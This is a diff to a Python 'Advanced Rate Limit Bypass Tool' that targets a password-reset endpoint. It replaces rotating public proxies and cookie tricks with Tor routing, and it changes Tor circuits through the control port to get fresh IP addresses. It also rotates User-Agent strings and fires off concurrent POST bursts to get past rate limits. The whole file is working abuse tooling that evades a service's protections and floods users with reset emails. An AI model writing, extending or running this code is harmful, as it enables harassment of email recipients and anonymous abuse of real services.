@@ -9,22 +9,27 @@ from fake_useragent import UserAgent
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Fetch dynamic proxy list (Optional: Use if needed)
-def get_proxies():
-    url = "https://www.proxy-list.download/api/v1/get?type=http"
-    try:
-        response = requests.get(url)
-        proxy_list = response.text.split("\r\n")[:-1]
-        return [f"http://{proxy}" for proxy in proxy_list]
-    except Exception as e:
-        logging.error(f"Failed to fetch proxies: {e}")
-        return []
-
-# Initialize proxies
-proxies = get_proxies()
-
-# User-Agent rotation
+# Initialize User-Agent rotation
 ua = UserAgent()
+
+# Tor proxy configuration
+TOR_PROXY = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050',
+}
+
+# Function to restart Tor circuit for a fresh IP
+def change_tor_ip():
+    try:
+        with open("/var/run/tor/control.authcookie", "rb") as f:
+            auth_cookie = f.read()
+        import stem.control
+        with stem.control.Controller.from_port(port=9051) as controller:
+            controller.authenticate(password='your_tor_password')  # Change this in torrc
+            controller.signal(stem.Signal.NEWNYM)
+        logging.info("Tor IP changed successfully!")
+    except Exception as e:
+        logging.error(f"Failed to change Tor IP: {e}")
 
 # Enhanced Rate Limit Detection
 def check_rate_limit(url, email):
@@ -44,29 +49,24 @@ def check_rate_limit(url, email):
 
     return False, 0
 
-# Function to send an email with different bypass techniques
-def send_email(url, email, headers=None, proxy=None, use_cookies=False):
+# Function to send an email using Tor
+def send_email(url, email, headers=None, use_tor=False):
     try:
-        session = requests.Session()
-        if use_cookies:
-            session.get(url)  # Establish session to generate cookies
-
-        response = session.post(url, data={'email': email}, headers=headers, proxies=proxy)
+        proxy = TOR_PROXY if use_tor else None
+        response = requests.post(url, data={'email': email}, headers=headers, proxies=proxy)
         
         if response.status_code == 200:
-            logging.info(f"Email sent successfully to {email}")
+            logging.info(f"Email sent successfully using {'Tor' if use_tor else 'Direct Connection'}")
         else:
-            logging.warning(f"Failed to send email to {email}: {response.status_code}")
+            logging.warning(f"Failed to send email: {response.status_code}")
     except Exception as e:
-        logging.error(f"Error sending email to {email}: {e}")
+        logging.error(f"Error sending email: {e}")
 
 # Bypass Techniques
 def bypass_rate_limit(url, email):
     methods = [
         lambda: send_email(url, email, headers={'User-Agent': ua.random}),
-        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'http': random.choice(proxies)}),
-        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'https': random.choice(proxies)}),
-        lambda: send_email(url, email, headers={'User-Agent': ua.random}, use_cookies=True),
+        lambda: send_email(url, email, headers={'User-Agent': ua.random}, use_tor=True),
     ]
 
     for method in methods:
@@ -82,7 +82,7 @@ def bypass_rate_limit(url, email):
 
 # Main function
 def main():
-    parser = argparse.ArgumentParser(description='Advanced Rate Limit Bypass Tool')
+    parser = argparse.ArgumentParser(description='Advanced Rate Limit Bypass Tool with Tor Support')
     parser.add_argument('--target', required=True, help='Target URL for password reset')
     args = parser.parse_args()
 
@@ -91,14 +91,15 @@ def main():
     has_rate_limit, delay = check_rate_limit(args.target, email)
     
     if has_rate_limit:
-        logging.info("Rate limit found. Attempting to bypass...")
+        logging.info("Rate limit found. Attempting to bypass using Tor...")
+        change_tor_ip()  # Switch to a new Tor IP
         bypass_rate_limit(args.target, email)
     else:
-        logging.info("No rate limit found. Sending emails...")
+        logging.info("No rate limit found. Sending emails normally...")
 
-        # Send multiple emails concurrently
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(send_email, args.target, email) for _ in range(10)]
+        # Send multiple emails concurrently via Tor
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(send_email, args.target, email, use_tor=True) for _ in range(5)]
             for future in concurrent.futures.as_completed(futures):
                 try:
                     future.result()
